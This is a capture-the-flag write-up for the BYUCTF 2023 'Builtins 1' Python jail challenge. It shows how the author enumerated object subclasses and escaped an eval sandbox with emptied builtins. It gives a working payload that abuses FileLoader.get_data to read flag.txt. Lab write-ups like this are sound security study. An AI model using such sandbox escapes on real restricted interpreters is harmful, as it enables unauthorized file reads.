
### Builtins 1

![builtins_1](https://github.com/Hed6eH0g/ctf/blob/main/2023/byuctf/jail/builtins_1/figs/builtins_1_0.png)

Since the challenge specifies the python version, we begun with building a python container with the corresponding version.
Then, a brief survey with the string `eval(input("code> "), {"__builtins__": {}}, {"__builtins__": {}}` leads us to [a post in the hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#builtins) and found that `().__class__.__bases__[0].__subclasses__()` allows us to look for some useful methods.

Thus, we make the following code to enumerate the list of available methods in the subclasses. 
```
c = ().__class__.__bases__[0].__subclasses__()
# print(c)
# print('')
i = 0
for ci in c:
    print(f'{i}: {ci})
    import inspect
    for m in inspect.getmembers(ci):     
        print(m)
    print('')
    print(' =================== ')       
    print('')
    i += 1
```

After checking the list briefly, we further modified the code to reduce candidates of methods as follows:
```
c = ().__class__.__bases__[0].__subclasses__()
# print(c)
# print('')
i = 0
for ci in c:
    # print(ci)
    import inspect
    get_list = []
    read_list = []
    for m in inspect.getmembers(ci):     
        if 'get' in m[0]:
            if 'getstate' in m[0] or 'getattr' in m[0]:
                continue
            get_list.append(m)
        if 'read' in m[0]:
            read_list.append(m)

            # print(m)
    if len(get_list) > 0 or len(read_list) > 0:
        print(f'{i}: {ci}')
        if len(get_list) > 0:
            for gi in get_list:
                print(gi)
        if len(read_list) > 0:
            for ri in read_list:
                print(ri)
        print('')
        print(' =================== ')   
        print('')
    i += 1

```

This allowed us to find that there is 'get_data', and examining `().__class__.__bases__[0].__subclasses__()[124].get_data()` returns the error `TypeError: FileLoader.get_data() missing 2 required positional arguments: 'self' and 'path'`. 
Thus, what we need to do next is filling up the arguments `self` and `path`, and found that `().__class__.__bases__[0].__subclasses__()[124].get_data('', 'flag.txt')` allowed us to access the flag.
